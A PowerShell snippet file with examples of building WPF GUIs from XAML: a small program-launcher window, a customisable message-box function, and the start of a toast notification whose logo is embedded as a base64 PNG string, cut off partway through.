
function func_wpf_xaml2
{
    . "$env:ProgramData\powershell_collected_codesnippets_examples.ps1"
<# Author      : Jim Moyle @jimmoyle   GitHub      : https://github.com/JimMoyle/GUIDemo #>

<# syntax which Visual Studio 2015 creates #>
$inputXML = @'
<Window x:Name="MyWindow" x:Class="GUIDemo.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        xmlns:local="clr-namespace:GUIDemo"
        mc:Ignorable="d"
        Title="MainWindow" Height="350" Width="525">
    <Grid Background="#FF1187A8" RenderTransformOrigin="0.216,0.276">
        <Button x:Name="MyButton" Content="Run Program" HorizontalAlignment="Left" Margin="295,224,0,0" VerticalAlignment="Top" Width="75" RenderTransformOrigin="3.948,-3.193"/>
        <Image x:Name="Myimage" HorizontalAlignment="Left" Height="100" Margin="104,72,0,0" VerticalAlignment="Top" Width="100"/>
        <TextBox x:Name="MyTextBox" HorizontalAlignment="Left" Height="23" Margin="86,222,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="157"/>
        <TextBlock HorizontalAlignment="Left" Margin="295,72,0,0" TextWrapping="Wrap" Text="@jimmoyle" VerticalAlignment="Top" FontSize="24"/>
    </Grid>
</Window>
'@


#========================================================
#code from previous script
#========================================================

#Add in the frameworks so that we can create the WPF GUI
Add-Type -AssemblyName presentationframework, presentationcore
#Create empty hashtable into which we will place the GUI objects
$wpf = @{ }
#Grab the content of the Visual Studio xaml file as a string
#$inputXML = Get-Content -Path ".\WPFGUIinTenLines\MainWindow.xaml"
#clean up xml there is syntax which Visual Studio 2015 creates which PoSH can't understand
$inputXMLClean = $inputXML -replace 'mc:Ignorable="d"','' -replace "x:N",'N' -replace 'x:Class=".*?"','' -replace 'd:DesignHeight="\d*?"','' -replace 'd:DesignWidth="\d*?"',''
#change string variable into xml
[xml]$xaml = $inputXMLClean
$reader = New-Object System.Xml.XmlNodeReader $xaml
#read xml data into xaml node reader object
$tempform = [Windows.Markup.XamlReader]::Load($reader)
#select each named node using an Xpath expression.
$namedNodes = $xaml.SelectNodes("//*[@*[contains(translate(name(.),'n','N'),'Name')]]")
#add all the named nodes as members to the $wpf variable, this also adds in the correct type for the objects.
$namedNodes | ForEach-Object {$wpf.Add($_.Name, $tempform.FindName($_.Name))}

#========================================================
#Your Code goes here
#========================================================


#This code runs when the button is clicked
$wpf.MyButton.add_Click({

$programname = $wpf.MytextBox.text

Start-Process $programname

	})

#=======================================================
#End of Your Code
#=======================================================


$wpf.MyWindow.ShowDialog() | Out-Null
}


function func_wpf_msgbox2
{

    Function New-WPFMessageBox {

    # For examples for use, see my blog:
    # https://smsagent.wordpress.com/2017/08/24/a-customisable-wpf-messagebox-for-powershell/
    
    # Define Parameters
    [CmdletBinding()]
    Param
    (
        # The popup Content
        [Parameter(Mandatory=$True,Position=0)]
        [Object]$Content,

        # The window title
        [Parameter(Mandatory=$false,Position=1)]
        [string]$Title,

        # The buttons to add
        [Parameter(Mandatory=$false,Position=2)]
        [ValidateSet('OK','OK-Cancel','Abort-Retry-Ignore','Yes-No-Cancel','Yes-No','Retry-Cancel','Cancel-TryAgain-Continue','None')]
        [array]$ButtonType = 'OK',

        # The buttons to add
        [Parameter(Mandatory=$false,Position=3)]
        [array]$CustomButtons,

        # Content font size
        [Parameter(Mandatory=$false,Position=4)]
        [int]$ContentFontSize = 14,

        # Title font size
        [Parameter(Mandatory=$false,Position=5)]
        [int]$TitleFontSize = 14,

        # BorderThickness
        [Parameter(Mandatory=$false,Position=6)]
        [int]$BorderThickness = 0,

        # CornerRadius
        [Parameter(Mandatory=$false,Position=7)]
        [int]$CornerRadius = 8,

        # ShadowDepth
        [Parameter(Mandatory=$false,Position=8)]
        [int]$ShadowDepth = 3,

        # BlurRadius
        [Parameter(Mandatory=$false,Position=9)]
        [int]$BlurRadius = 20,

        # WindowHost
        [Parameter(Mandatory=$false,Position=10)]
        [object]$WindowHost,

        # Timeout in seconds,
        [Parameter(Mandatory=$false,Position=11)]
        [int]$Timeout,

        # Code for Window Loaded event,
        [Parameter(Mandatory=$false,Position=12)]
        [scriptblock]$OnLoaded,

        # Code for Window Closed event,
        [Parameter(Mandatory=$false,Position=13)]
        [scriptblock]$OnClosed

    )

    # Dynamically Populated parameters
    DynamicParam {
        
        # ContentBackground
        $ContentBackground = 'ContentBackground'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $RuntimeParameterDictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        $arrSet = [System.Drawing.Brushes] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.ContentBackground = "White"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($ContentBackground, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($ContentBackground, $RuntimeParameter)
        

        # FontFamily
        $FontFamily = 'FontFamily'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute)  
        $arrSet = [System.Drawing.FontFamily]::Families | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)
        $AttributeCollection.Add($ValidateSetAttribute)
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($FontFamily, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($FontFamily, $RuntimeParameter)
        $PSBoundParameters.FontFamily = "Segui"

        # TitleFontWeight
        $TitleFontWeight = 'TitleFontWeight'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Windows.FontWeights] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.TitleFontWeight = "Normal"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($TitleFontWeight, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($TitleFontWeight, $RuntimeParameter)

        # ContentFontWeight
        $ContentFontWeight = 'ContentFontWeight'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Windows.FontWeights] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.ContentFontWeight = "Normal"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($ContentFontWeight, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($ContentFontWeight, $RuntimeParameter)
        

        # ContentTextForeground
        $ContentTextForeground = 'ContentTextForeground'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Drawing.Brushes] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.ContentTextForeground = "Black"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($ContentTextForeground, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($ContentTextForeground, $RuntimeParameter)

        # TitleTextForeground
        $TitleTextForeground = 'TitleTextForeground'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Drawing.Brushes] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.TitleTextForeground = "Black"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($TitleTextForeground, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($TitleTextForeground, $RuntimeParameter)

        # BorderBrush
        $BorderBrush = 'BorderBrush'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Drawing.Brushes] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.BorderBrush = "Black"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($BorderBrush, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($BorderBrush, $RuntimeParameter)


        # TitleBackground
        $TitleBackground = 'TitleBackground'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Drawing.Brushes] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.TitleBackground = "White"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($TitleBackground, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($TitleBackground, $RuntimeParameter)

        # ButtonTextForeground
        $ButtonTextForeground = 'ButtonTextForeground'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Drawing.Brushes] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.ButtonTextForeground = "Black"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($ButtonTextForeground, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($ButtonTextForeground, $RuntimeParameter)

        # Sound
        #$Sound = 'Sound'
        #$AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        #$ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        #$ParameterAttribute.Mandatory = $False
        #$ParameterAttribute.Position = 14
        #$AttributeCollection.Add($ParameterAttribute) 
        #$arrSet = (Get-ChildItem "$env:SystemDrive\Windows\Media" -Filter Windows* | Select -ExpandProperty Name).Replace('.wav','')
        #$ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        #$AttributeCollection.Add($ValidateSetAttribute)
        #$RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($Sound, [string], $AttributeCollection)
        #$RuntimeParameterDictionary.Add($Sound, $RuntimeParameter)

        return $RuntimeParameterDictionary
    }

    Begin {
        Add-Type -AssemblyName PresentationFramework
    }
    
    Process {

# Define the XAML markup
[XML]$Xaml = @"
<Window 
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        x:Name="Window" Title="" SizeToContent="WidthAndHeight" WindowStartupLocation="CenterScreen" WindowStyle="None" ResizeMode="NoResize" AllowsTransparency="True" Background="Transparent" Opacity="1">
    <Window.Resources>
        <Style TargetType="{x:Type Button}">
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border>
                            <Grid Background="{TemplateBinding Background}">
                                <ContentPresenter />
                            </Grid>
                        </Border>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
    </Window.Resources>
    <Border x:Name="MainBorder" Margin="10" CornerRadius="$CornerRadius" BorderThickness="$BorderThickness" BorderBrush="$($PSBoundParameters.BorderBrush)" Padding="0" >
        <Border.Effect>
            <DropShadowEffect x:Name="DSE" Color="Black" Direction="270" BlurRadius="$BlurRadius" ShadowDepth="$ShadowDepth" Opacity="0.6" />
        </Border.Effect>
        <Border.Triggers>
            <EventTrigger RoutedEvent="Window.Loaded">
                <BeginStoryboard>
                    <Storyboard>
                        <DoubleAnimation Storyboard.TargetName="DSE" Storyboard.TargetProperty="ShadowDepth" From="0" To="$ShadowDepth" Duration="0:0:1" AutoReverse="False" />
                        <DoubleAnimation Storyboard.TargetName="DSE" Storyboard.TargetProperty="BlurRadius" From="0" To="$BlurRadius" Duration="0:0:1" AutoReverse="False" />
                    </Storyboard>
                </BeginStoryboard>
            </EventTrigger>
        </Border.Triggers>
        <Grid >
            <Border Name="Mask" CornerRadius="$CornerRadius" Background="$($PSBoundParameters.ContentBackground)" />
            <Grid x:Name="Grid" Background="$($PSBoundParameters.ContentBackground)">
                <Grid.OpacityMask>
                    <VisualBrush Visual="{Binding ElementName=Mask}"/>
                </Grid.OpacityMask>
                <StackPanel Name="StackPanel" >                   
                    <TextBox Name="TitleBar" IsReadOnly="True" IsHitTestVisible="False" Text="$Title" Padding="10" FontFamily="$($PSBoundParameters.FontFamily)" FontSize="$TitleFontSize" Foreground="$($PSBoundParameters.TitleTextForeground)" FontWeight="$($PSBoundParameters.TitleFontWeight)" Background="$($PSBoundParameters.TitleBackground)" HorizontalAlignment="Stretch" VerticalAlignment="Center" Width="Auto" HorizontalContentAlignment="Center" BorderThickness="0"/>
                    <DockPanel Name="ContentHost" Margin="0,10,0,10"  >
                    </DockPanel>
                    <DockPanel Name="ButtonHost" LastChildFill="False" HorizontalAlignment="Center" >
                    </DockPanel>
                </StackPanel>
            </Grid>
        </Grid>
    </Border>
</Window>
"@

[XML]$ButtonXaml = @"
<Button xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" Width="Auto" Height="30" FontFamily="Segui" FontSize="16" Background="Transparent" Foreground="White" BorderThickness="1" Margin="10" Padding="20,0,20,0" HorizontalAlignment="Right" Cursor="Hand"/>
"@

[XML]$ButtonTextXaml = @"
<TextBlock xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" FontFamily="$($PSBoundParameters.FontFamily)" FontSize="16" Background="Transparent" Foreground="$($PSBoundParameters.ButtonTextForeground)" Padding="20,5,20,5" HorizontalAlignment="Center" VerticalAlignment="Center"/>
"@

[XML]$ContentTextXaml = @"
<TextBlock xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" Text="$Content" Foreground="$($PSBoundParameters.ContentTextForeground)" DockPanel.Dock="Right" HorizontalAlignment="Center" VerticalAlignment="Center" FontFamily="$($PSBoundParameters.FontFamily)" FontSize="$ContentFontSize" FontWeight="$($PSBoundParameters.ContentFontWeight)" TextWrapping="Wrap" Height="Auto" MaxWidth="500" MinWidth="50" Padding="10"/>
"@

    # Load the window from XAML
    $Window = [Windows.Markup.XamlReader]::Load((New-Object -TypeName System.Xml.XmlNodeReader -ArgumentList $xaml))

    # Custom function to add a button
    Function Add-Button {
        Param($Content)
        $Button = [Windows.Markup.XamlReader]::Load((New-Object -TypeName System.Xml.XmlNodeReader -ArgumentList $ButtonXaml))
        $ButtonText = [Windows.Markup.XamlReader]::Load((New-Object -TypeName System.Xml.XmlNodeReader -ArgumentList $ButtonTextXaml))
        $ButtonText.Text = "$Content"
        $Button.Content = $ButtonText
        $Button.Add_MouseEnter({
            $This.Content.FontSize = "17"
        })
        $Button.Add_MouseLeave({
            $This.Content.FontSize = "16"
        })
        $Button.Add_Click({
            $Window.Close()
            Write-host $This.Content.Text
        })
        $Window.FindName('ButtonHost').AddChild($Button)
    }

    # Add buttons
    If ($ButtonType -eq "OK")
    {
        Add-Button -Content "OK"
    }

    If ($ButtonType -eq "OK-Cancel")
    {
        Add-Button -Content "OK"
        Add-Button -Content "Cancel"
    }

    If ($ButtonType -eq "Abort-Retry-Ignore")
    {
        Add-Button -Content "Abort"
        Add-Button -Content "Retry"
        Add-Button -Content "Ignore"
    }

    If ($ButtonType -eq "Yes-No-Cancel")
    {
        Add-Button -Content "Yes"
        Add-Button -Content "No"
        Add-Button -Content "Cancel"
    }

    If ($ButtonType -eq "Yes-No")
    {
        Add-Button -Content "Yes"
        Add-Button -Content "No"
    }

    If ($ButtonType -eq "Retry-Cancel")
    {
        Add-Button -Content "Retry"
        Add-Button -Content "Cancel"
    }

    If ($ButtonType -eq "Cancel-TryAgain-Continue")
    {
        Add-Button -Content "Cancel"
        Add-Button -Content "TryAgain"
        Add-Button -Content "Continue"
    }

    If ($ButtonType -eq "None" -and $CustomButtons)
    {
        Foreach ($CustomButton in $CustomButtons)
        {
            Add-Button -Content "$CustomButton"
        }
    }

    # Remove the title bar if no title is provided
    If ($Title -eq "")
    {
        $TitleBar = $Window.FindName('TitleBar')
        $Window.FindName('StackPanel').Children.Remove($TitleBar)
    }

    # Add the Content
    If ($Content -is [String])
    {
        # Replace double quotes with single to avoid quote issues in strings
        If ($Content -match '"')
        {
            $Content = $Content.Replace('"',"'")
        }
        
        # Use a text box for a string value...
        $ContentTextBox = [Windows.Markup.XamlReader]::Load((New-Object -TypeName System.Xml.XmlNodeReader -ArgumentList $ContentTextXaml))
        $Window.FindName('ContentHost').AddChild($ContentTextBox)
    }
    Else
    {
        # ...or add a WPF element as a child
        Try
        {
            $Window.FindName('ContentHost').AddChild($Content) 
        }
        Catch
        {
            $_
        }        
    }

    # Enable window to move when dragged
    $Window.FindName('Grid').Add_MouseLeftButtonDown({
        $Window.DragMove()
    })

    # Activate the window on loading
    If ($OnLoaded)
    {
        $Window.Add_Loaded({
            $This.Activate()
            Invoke-Command $OnLoaded
        })
    }
    Else
    {
        $Window.Add_Loaded({
            $This.Activate()
        })
    }
    

    # Stop the dispatcher timer if exists
    If ($OnClosed)
    {
        $Window.Add_Closed({
            If ($DispatcherTimer)
            {
                $DispatcherTimer.Stop()
            }
            Invoke-Command $OnClosed
        })
    }
    Else
    {
        $Window.Add_Closed({
            If ($DispatcherTimer)
            {
                $DispatcherTimer.Stop()
            }
        })
    }
    

    # If a window host is provided assign it as the owner
    If ($WindowHost)
    {
        $Window.Owner = $WindowHost
        $Window.WindowStartupLocation = "CenterOwner"
    }

    # If a timeout value is provided, use a dispatcher timer to close the window when timeout is reached
    If ($Timeout)
    {
        $Stopwatch = New-object System.Diagnostics.Stopwatch
        $TimerCode = {
            If ($Stopwatch.Elapsed.TotalSeconds -ge $Timeout)
            {
                $Stopwatch.Stop()
                $Window.Close()
            }
        }
        $DispatcherTimer = New-Object -TypeName System.Windows.Threading.DispatcherTimer
        $DispatcherTimer.Interval = [TimeSpan]::FromSeconds(1)
        $DispatcherTimer.Add_Tick($TimerCode)
        $Stopwatch.Start()
        $DispatcherTimer.Start()
    }

    # Play a sound
    If ($($PSBoundParameters.Sound))
    {
        $SoundFile = "$env:SystemDrive\Windows\Media\$($PSBoundParameters.Sound).wav"
        $SoundPlayer = New-Object System.Media.SoundPlayer -ArgumentList $SoundFile
        $SoundPlayer.Add_LoadCompleted({
            $This.Play()
            $This.Dispose()
        })
        $SoundPlayer.LoadAsync()
    }

    # Display the window
    $null = $window.Dispatcher.InvokeAsync{$window.ShowDialog()}.Wait()

    }
}

# Load required assemblies
Add-Type -AssemblyName PresentationFramework, PresentationCore , System.Windows.Forms

#https://smsagent.blog/2018/02/01/create-a-custom-toast-notification-with-wpf-and-powershell/
# Code to create a base64 string from an image file, so that you can include it in the script as a string
#$File = "C:\somepicturefile.png"
#$Image = [System.Drawing.Image]::FromFile($File)
#$MemoryStream = New-Object System.IO.MemoryStream
#$Image.Save($MemoryStream, $Image.RawFormat)
#[System.Byte[]]$Bytes = $MemoryStream.ToArray()
#$Base64 = [System.Convert]::ToBase64String($Bytes)
#$Image.Dispose()
#$MemoryStream.Dispose()
#$Base64 > c:\base64.txt

# Create the custom logo from Base64 string
$Base64='
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
